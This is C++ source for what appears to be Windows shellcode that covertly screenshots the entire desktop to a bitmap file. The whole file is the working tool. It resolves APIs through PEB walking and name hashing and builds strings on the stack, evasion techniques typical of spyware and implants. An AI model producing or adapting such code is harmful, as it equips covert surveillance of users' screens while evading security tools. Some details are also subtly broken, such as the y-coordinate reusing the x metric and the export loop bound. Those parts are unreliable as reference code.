#include <Windows.h>
#include <stdint.h>
#include "vendor/native_defs.h"

#define SHC_FORCEINLINE __attribute__((always_inline)) inline
#define ptr_cast reinterpret_cast


/* For dynamic API and module resolution */
namespace Hash {
    using Type = uint32_t;
    enum Value : unsigned {
      Kernel32            = 914211162U,
      LoadLibraryA        = 1066379828U,
      CloseHandle         = 2780312615U,
      GetSystemMetrics    = 3975328881U,
      CreateFileA         = 2638520141U,
      GetDC               = 1064729335U,
      GetCurrentObject    = 1897939139U,
      GetObjectW          = 2302279684U,
      DeleteObject        = 1984624300U,
      CreateCompatibleDC  = 355417500U,
      CreateDIBSection    = 4198543045U,
      SelectObject        = 369853518U,
      BitBlt              = 2649939926U,
      WriteFile           = 3647783089U,
      ReleaseDC           = 2746204476U,
      DeleteDC            = 2529722559U,
    };
}

/* Type aliases for function pointers */
using pLoadLibrary          = decltype(&::LoadLibraryA);        // KERNEL32
using pCloseHandle          = decltype(&::CloseHandle);         // KERNEL32
using pGetSystemMetrics     = decltype(&::GetSystemMetrics);    // USER32
using pCreateFileA          = decltype(&::CreateFileA);         // KERNEL32
using pGetDC                = decltype(&::GetDC);               // USER32
using pGetCurrentObject     = decltype(&::GetCurrentObject);    // GDI32
using pGetObjectW           = decltype(&::GetObjectW);          // GDI32
using pDeleteObject         = decltype(&::DeleteObject);        // GDI32
using pCreateCompatibleDC   = decltype(&::CreateCompatibleDC);  // GDI32
using pCreateDIBSection     = decltype(&::CreateDIBSection);    // GDI32
using pSelectObject         = decltype(&::SelectObject);        // GDI32
using pBitBlt               = decltype(&::BitBlt);              // GDI32
using pWriteFile            = decltype(&::WriteFile);           // KERNEL32
using pReleaseDC            = decltype(&::ReleaseDC);           // USER32
using pDeleteDC             = decltype(&::DeleteDC);            // GDI32

/* Function prototypes */
template<typename T>
auto hash_bytes(void *bytes, uint32_t len)           -> Hash::Type;
auto my_strlen(const char *str)                      -> uint32_t;
auto get_module_base(Hash::Type ht)                  -> uint8_t*;
auto get_func_addr(uint8_t *mod_base, Hash::Type ht) -> void*;


asm(
  "__main:                        \n"
  " push rsi                      \n"
  " mov  rsi, rsp                 \n"
  " and  rsp, 0xFFFFFFFFFFFFFFF0  \n"
  " sub  rsp, 0x20                \n"
  " call screenshot_impl          \n"
  " mov  rsp, rsi                 \n"
  " pop  rsi                      \n"
  " ret                           \n"
);

extern "C" int screenshot_impl() {
    char user32_str  [] = {'U','S','E','R','3','2','.','D','L','L','\0'};
    char gdi32_str   [] = {'G','D','I','3','2','.','D','L','L','\0'};
    char filename_str[] = {'s','s','.','b','m','p','\0'};

    pLoadLibrary          pload_lib        = nullptr;
    pCloseHandle          pclosehandle     = nullptr;
    pGetSystemMetrics     pget_metrics     = nullptr;
    pCreateFileA          pcreatefilea     = nullptr;
    pGetDC                pgetdc           = nullptr;
    pGetCurrentObject     pgetcurrobject   = nullptr;
    pGetObjectW           pgetobjectw      = nullptr;
    pDeleteObject         pdeleteobject    = nullptr;
    pCreateCompatibleDC   pcreate_compatdc = nullptr;
    pCreateDIBSection     pcreate_dibscn   = nullptr;
    pSelectObject         pselectobject    = nullptr;
    pBitBlt               pbitblt          = nullptr;
    pWriteFile            pwritefile       = nullptr;
    pReleaseDC            preleasedc       = nullptr;
    pDeleteDC             pdeletedc        = nullptr;

    uint8_t* pk32    = nullptr;              // Base virtual address of KERNEL32.DLL
    uint8_t* puser32 = nullptr;              // Base virtual address of USER32.DLL
    uint8_t* pgdi32  = nullptr;              // Base virtual address of GDI32.DLL

    HANDLE   hfile    = nullptr;             // Output file (we'll dump the bitmap here)
    HGDIOBJ  htmp_bmp = nullptr;             // Temp bitmap so we can get desktop width and height
    HBITMAP  hbmp     = nullptr;             // The bitmap handle
    HDC      hdc      = nullptr;             // Device context handle
    HDC      hmem_dc  = nullptr;
    uint8_t* bits     = nullptr;

    BITMAPFILEHEADER bf_hdr    = { 0 };      // bmp file header
    BITMAPINFOHEADER bi_hdr    = { 0 };      // bmp info header
    BITMAPINFO bitmap_info     = { 0 };      // bmp info
    BITMAP bitmap_alldesktops  = { 0 };
    DWORD size_bytes           = { 0 };      // bmp size in bytes
    DWORD written              = { 0 };      // bytes written to output file


    //////////////////////////////////////////////////////////////////////////////////////////////////////
    // API Resolution.

    pk32 = get_module_base(Hash::Kernel32);
    if(pk32 == nullptr) {
        return 1;
    }

    pload_lib = ptr_cast<pLoadLibrary>(get_func_addr(pk32, Hash::LoadLibraryA));
    if(pload_lib == nullptr) {
        return 1;
    }

    puser32 = ptr_cast<uint8_t*>(pload_lib(user32_str));
    pgdi32  = ptr_cast<uint8_t*>(pload_lib(gdi32_str));
    if(!puser32 || !pgdi32) {
        return 1;
    }

    pget_metrics     = ptr_cast<pGetSystemMetrics>(get_func_addr(puser32, Hash::GetSystemMetrics));
    pcreatefilea     = ptr_cast<pCreateFileA>(get_func_addr(pk32, Hash::CreateFileA));
    pclosehandle     = ptr_cast<pCloseHandle>(get_func_addr(pk32, Hash::CloseHandle));
    pgetdc           = ptr_cast<pGetDC>(get_func_addr(puser32, Hash::GetDC));
    pgetcurrobject   = ptr_cast<pGetCurrentObject>(get_func_addr(pgdi32, Hash::GetCurrentObject));
    pgetobjectw      = ptr_cast<pGetObjectW>(get_func_addr(pgdi32, Hash::GetObjectW));
    pdeleteobject    = ptr_cast<pDeleteObject>(get_func_addr(pgdi32, Hash::DeleteObject));
    pcreate_compatdc = ptr_cast<pCreateCompatibleDC>(get_func_addr(pgdi32, Hash::CreateCompatibleDC));
    pcreate_dibscn   = ptr_cast<pCreateDIBSection>(get_func_addr(pgdi32, Hash::CreateDIBSection));
    pselectobject    = ptr_cast<pSelectObject>(get_func_addr(pgdi32, Hash::SelectObject));
    pbitblt          = ptr_cast<pBitBlt>(get_func_addr(pgdi32, Hash::BitBlt));
    pwritefile       = ptr_cast<pWriteFile>(get_func_addr(pk32, Hash::WriteFile));
    preleasedc       = ptr_cast<pReleaseDC>(get_func_addr(puser32, Hash::ReleaseDC));
    pdeletedc        = ptr_cast<pDeleteDC>(get_func_addr(pgdi32, Hash::DeleteDC));

    if(!pget_metrics
        || !pcreatefilea
        || !pclosehandle
        || !pgetdc
        || !pgetcurrobject
        || !pgetobjectw
        || !pdeleteobject
        || !pcreate_compatdc
        || !pcreate_dibscn
        || !pselectobject
        || !pbitblt
        || !pwritefile
        || !preleasedc
        || !pdeletedc
    ) {
        return 1;
    }


    //////////////////////////////////////////////////////////////////////////////////////////////////////
    // Open output file.

    hfile = pcreatefilea(
        filename_str,
        FILE_GENERIC_READ | FILE_GENERIC_WRITE,
        FILE_SHARE_READ   | FILE_SHARE_WRITE,
        nullptr,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );

    if(hfile == INVALID_HANDLE_VALUE) {
        return 1;
    }


    //////////////////////////////////////////////////////////////////////////////////////////////////////
    // Produce bitmap.

    hdc      = pgetdc(nullptr);
    htmp_bmp = pgetcurrobject(hdc, OBJ_BITMAP);
    pgetobjectw(htmp_bmp, sizeof(BITMAP), &bitmap_alldesktops);

    const long width  = bitmap_alldesktops.bmWidth;
    const long height = bitmap_alldesktops.bmHeight;
    pdeleteobject(htmp_bmp);

    bf_hdr.bfType          = (uint16_t)('B' | ('M' << 8));
    bf_hdr.bfOffBits       = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bi_hdr.biSize          = sizeof(BITMAPINFOHEADER);
    bi_hdr.biBitCount      = 24;
    bi_hdr.biCompression   = BI_RGB;
    bi_hdr.biPlanes        = 1;
    bi_hdr.biWidth         = width;
    bi_hdr.biHeight        = height;
    bitmap_info.bmiHeader  = bi_hdr;
    size_bytes             = ( ((24 * width + 31) & ~31) / 8 ) * height;

    hmem_dc = pcreate_compatdc(hdc);
    hbmp    = pcreate_dibscn(hdc, &bitmap_info, DIB_RGB_COLORS, reinterpret_cast<void**>(&bits), nullptr, 0);
    pselectobject(hmem_dc, hbmp);

    // Initiate bit-block transfer:
    // source device context -> off screen buffer
    pbitblt(
      hmem_dc,                         // In-memory device context
      0,                               // Destination x coord
      0,                               // Destination y coord
      width,                           // Width
      height,                          // Heght
      hdc,                             // Source DC
      pget_metrics(SM_XVIRTUALSCREEN), // Source x coord
      pget_metrics(SM_XVIRTUALSCREEN), // Source y coord
      SRCCOPY                          // Raster operation type. Indicates no modifications
    );


    //////////////////////////////////////////////////////////////////////////////////////////////////////
    // Write the bitmap into the file, clean up resources.

    pwritefile(hfile, &bf_hdr, sizeof(BITMAPFILEHEADER), &written, nullptr);
    pwritefile(hfile, &bi_hdr, sizeof(BITMAPINFOHEADER), &written, nullptr);
    pwritefile(hfile, bits, size_bytes, &written, nullptr);

    pdeletedc(hmem_dc);
    preleasedc(nullptr, hdc);
    pdeleteobject(hbmp);
    pclosehandle(hfile);

    return 0;
}


SHC_FORCEINLINE uint32_t
my_strlen(const char* str) {
    const char* str2;
    for (str2 = str; *str2; ++str2) {}
    return str2 - str;
}

template<typename T>
SHC_FORCEINLINE Hash::Type hash_bytes(void* bytes, uint32_t len) {
    const auto* str = static_cast<T*>(bytes);
    Hash::Type seed = 7;
    Hash::Type hash = 0;
    uint32_t index  = 0;

    if(len == 0) {
        len = my_strlen(static_cast<const char *>(bytes));
    }

    while(index != len) {
        T ch = str[index];
        if(ch >= static_cast<T>('a') && ch <= static_cast<T>('z')) {
            ch -= 0x20;
        }

        hash += ch;
        hash += hash << seed;
        hash ^= hash >> 6;
        ++index;
    }

    hash += hash << 3;
    hash ^= hash >> 11;
    hash += hash << 15;

    return hash;
}

SHC_FORCEINLINE uint8_t*
get_module_base(const Hash::Type ht) {
    PLDR_DATA_TABLE_ENTRY data  = nullptr;
    PLIST_ENTRY head            = nullptr;
    PLIST_ENTRY entry           = nullptr;

    head  = &NtCurrentTeb()->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList;
    entry = head->Flink;

    for (;head != entry; entry = entry->Flink) {
        data = reinterpret_cast<decltype(data)>(entry);
        if (hash_bytes<wchar_t>(data->BaseDllName.Buffer, data->BaseDllName.Length / sizeof(wchar_t)) == ht) {
            return static_cast<uint8_t*>(data->DllBase);
        }
    }

    return nullptr;
}

SHC_FORCEINLINE void*
get_func_addr(uint8_t* mod_base /* HMODULE */, const Hash::Type ht) {
    const auto* dos_hdr = reinterpret_cast<PIMAGE_DOS_HEADER>(mod_base);
    const auto* nt_hdrs = reinterpret_cast<PIMAGE_NT_HEADERS>(mod_base + dos_hdr->e_lfanew);
    const auto* exp_dir = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(mod_base + nt_hdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    const auto* addr_names = reinterpret_cast<PDWORD>(mod_base + exp_dir->AddressOfNames);
    const auto* addr_funcs = reinterpret_cast<PDWORD>(mod_base + exp_dir->AddressOfFunctions);
    const auto* addr_ords  = reinterpret_cast<PWORD>(mod_base + exp_dir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exp_dir->NumberOfFunctions; i++) {
        auto* func_name = reinterpret_cast<char*>(mod_base + addr_names[i]);
        auto* func_addr = mod_base + addr_funcs[addr_ords[i]];
        if(hash_bytes<char>(func_name, 0) == ht) {
            return func_addr;
        }
    }

    return nullptr;
}